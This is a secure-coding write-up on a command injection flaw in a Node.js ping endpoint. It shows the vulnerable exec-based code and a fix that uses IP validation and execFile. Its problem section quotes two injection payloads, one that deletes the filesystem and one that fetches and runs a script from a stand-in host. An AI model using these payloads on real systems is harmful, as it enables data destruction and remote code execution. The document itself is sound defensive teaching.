# [VULN-05] Command Injection

**Caught by:** SonarQube (SAST), OWASP ZAP (DAST)
**Files:** `app/server.js`

## The problem

User input is dropped straight into a shell command string. Shell
metacharacters let an attacker chain arbitrary commands:
`127.0.0.1; rm -rf /` or `127.0.0.1 && curl evil.sh | sh`.

### Before (vulnerable)

```js
const { exec } = require("child_process");

app.get("/api/admin/ping", (req, res) => {
  const { host } = req.query;
  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    if (error) return res.status(500).json({ error: stderr });
    res.json({ output: stdout });
  });
});
```

## The fix

Two changes: (1) **validate/allow-list** the input, and (2) use `execFile`
(or `spawn`) with an **argument array** so no shell is invoked and
metacharacters have no meaning.

### After (fixed)

```js
const { execFile } = require("child_process");
const net = require("net");

app.get("/api/admin/ping", (req, res) => {
  const { host } = req.query;

  // Allow-list: only accept a valid IPv4/IPv6 address.
  if (!net.isIP(host)) {
    return res.status(400).json({ error: "Invalid host" });
  }

  // execFile does NOT spawn a shell — args are passed directly to ping,
  // so ";", "&&", "|" etc. are just literal (and here, rejected) input.
  execFile("ping", ["-c", "1", host], (error, stdout, stderr) => {
    if (error) return res.status(500).json({ error: "Ping failed" });
    res.json({ output: stdout });
  });
});
```

## Why it works

- **No shell** = no shell metacharacter interpretation. `execFile` runs the
  binary with an argv array; the OS never parses `;` or `&&`.
- **Allow-listing** (`net.isIP`) means only things that actually look like
  hosts get through in the first place — defense in depth.

## Rule of thumb

Never build a shell command by concatenating user input. Prefer a library
that does the job without shelling out at all; if you must run a process,
use `execFile`/`spawn` with an args array and validate every input.
